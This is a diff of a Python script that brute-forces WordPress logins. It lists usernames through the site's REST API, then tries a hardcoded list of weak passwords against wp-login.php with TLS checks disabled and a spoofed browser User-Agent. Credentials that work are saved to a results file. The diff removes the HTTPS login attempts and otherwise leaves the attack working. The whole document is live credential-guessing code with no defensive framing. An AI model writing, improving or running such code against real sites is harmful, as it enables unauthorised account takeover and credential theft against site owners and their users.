@@ -26,14 +26,12 @@ passwordlist = ["password", "pass", "pass123", "admin123", "admin12345", "12345"
 
 def grabuser(url):
     try:
-        userjos_http = requests.get(f'http://{url}/wp-json/wp/v2/users', timeout=10, verify=False)
-        userjos_https = requests.get(f'https://{url}/wp-json/wp/v2/users', timeout=10, verify=False)
-        users_http = [user['slug'] for user in userjos_http.json()] if userjos_http.status_code == 200 else []
-        users_https = [user['slug'] for user in userjos_https.json()] if userjos_https.status_code == 200 else []
-        return users_http + users_https
+        userjos = requests.get(f'http://{url}/wp-json/wp/v2/users', timeout=10, verify=False)
+        if userjos.status_code == 200:
+            return [user['slug'] for user in userjos.json()]
     except:
         pass
-        return []
+    return []
 
 def wpweakpass(url):
     userfrjson = grabuser(url)
@@ -41,16 +39,10 @@ def wpweakpass(url):
         for username in userfrjson + usernamelist:
             for password in passwordlist:
                 r = requests.post(f'http://{url}/wp-login.php', data={'log': username, 'pwd': password}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=10, allow_redirects=True, verify=False)
-                r2 = requests.post(f'https://{url}/wp-login.php', data={'log': username, 'pwd': password}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=10, allow_redirects=True, verify=False)
-                if 'action=lostpassword' not in r.text and 'wp-admin/post.php' in r.text and r.status_code != 404:
+                if 'action=lostpassword' not in r.text and 'wp-admin/post.php' in r.text:
                     print(f'{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.GREEN}{username}{Fore.YELLOW}:{Fore.GREEN}{password}')
                     with open('result_wp.txt', 'a') as output:
                         output.write(f'http://{url}/wp-login.php | Username: {username} | Password: {password}\n')
-                    return True
-                elif 'action=lostpassword' not in r2.text and 'wp-admin/post.php' in r2.text and r2.status_code != 404:
-                    print(f'{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.GREEN}{username}{Fore.YELLOW}:{Fore.GREEN}{password}')
-                    with open('result_wp.txt', 'a') as output:
-                        output.write(f'https://{url}/wp-login.php | Username: {username} | Password: {password}\n')
                     return True
                 else:
                     print(f'{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] {url}{Fore.YELLOW} | {Fore.RED}{username}{Fore.YELLOW}:{Fore.RED}{password}')
